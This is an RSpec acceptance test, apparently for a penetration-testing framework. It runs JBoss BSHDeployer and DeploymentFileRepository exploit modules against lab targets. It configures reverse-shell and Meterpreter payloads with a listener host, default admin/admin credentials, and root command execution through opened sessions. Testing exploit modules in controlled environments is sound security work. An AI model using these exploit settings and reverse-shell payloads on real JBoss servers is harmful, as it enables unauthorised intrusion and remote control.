require 'acceptance_spec_helper'

RSpec.describe 'Native JBoss Java payload deployment targets' do
  include_context 'native JBoss target'

  before(:all) do
    argv = [RbConfig.ruby, 'test/module_targets/jboss_deployer/native_inspector.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-inspector.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-inspector-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
  end

  %w[bshdeployer deploymentfilerepository].each do |name|
    [
      ['open', 'POST', 0, 'java/meterpreter/reverse_tcp', {}],
      ['open', 'GET', 3, 'java/shell/reverse_tcp', {}],
      ['legacy', 'HEAD', 3, 'java/shell/reverse_tcp', {}],
      ['secured', 'POST', 3, 'java/meterpreter/reverse_tcp', { 'HttpUsername' => 'admin', 'HttpPassword' => 'admin' }]
    ].each do |service, verb, target, payload, credentials|
      it "opens #{payload} twice through #{name} #{service}/#{verb}/target#{target} and removes every WAR" do
        original = deployment_files(service)
        registry = deployment_registry(service)
        proof_path = '/tmp/module-target-jboss-session-proof'
        begin
          2.times do
            target_exec(service, 'test', '!', '-e', proof_path)
            output = deploy(name, service, verb, target, payload, credentials)
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            command = payload.include?('meterpreter') ? "execute -f /usr/bin/touch -a #{proof_path}" : "/usr/bin/touch #{proof_path}"
            flag = payload.include?('meterpreter') ? '-C' : '-c'
            proof = console_command("sessions -i #{session_id} #{flag} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            wait_for_expect(60, 0.1) do
              expect(target_exec(service, 'sh', '-c', "if test -f #{proof_path}; then stat -c %U #{proof_path}; fi").strip).to eq('root')
            end
            console_command('sessions -K')
            target_exec(service, 'rm', proof_path)
            expect(deployment_files(service)).to eq(original)
            wait_for_expect(30, 0.2) { expect(deployment_registry(service)).to eq(registry) }
          end
        ensure
          console_command('sessions -K')
          target_exec(service, 'rm', '-f', proof_path)
          cleanup_new_wars(service, original, registry)
        end
      end
    end

    it "refuses wrong credentials for #{name} without a session or uploaded WAR" do
      original = deployment_files('secured')
      output = deploy(name, 'secured', 'POST', 3, 'java/meterpreter/reverse_tcp', { 'HttpUsername' => 'admin', 'HttpPassword' => 'wrong-password', 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }, allow_errors: true)
      expect(output).to match(/authentication|Failed to deploy/i)
      expect(output).not_to match(/session \d+ opened/)
      expect(deployment_files('secured')).to eq(original)
    end

    it "refuses unrelated HTTP for #{name} without a session" do
      output = deploy(name, 'unrelated', 'POST', 3, 'java/shell/reverse_tcp', { 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }, allow_errors: true)
      expect(output).to match(/Failed to deploy|Unable to deploy/)
      expect(output).not_to match(/session \d+ opened/)
    end
  end

  def deploy(name, service, verb, target, payload, options, allow_errors: false)
    run_target_module("exploit/multi/http/jboss_#{name}", service, {
      'TARGETURI' => '/jmx-console', 'VERB' => verb, 'TARGET' => target,
      'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444,
      'Spawn' => 2, 'WfsDelay' => 10, 'DisablePayloadHandler' => false
    }.merge(options), action: 'run -z', allow_errors: allow_errors, command_timeout: 85)
  end
end
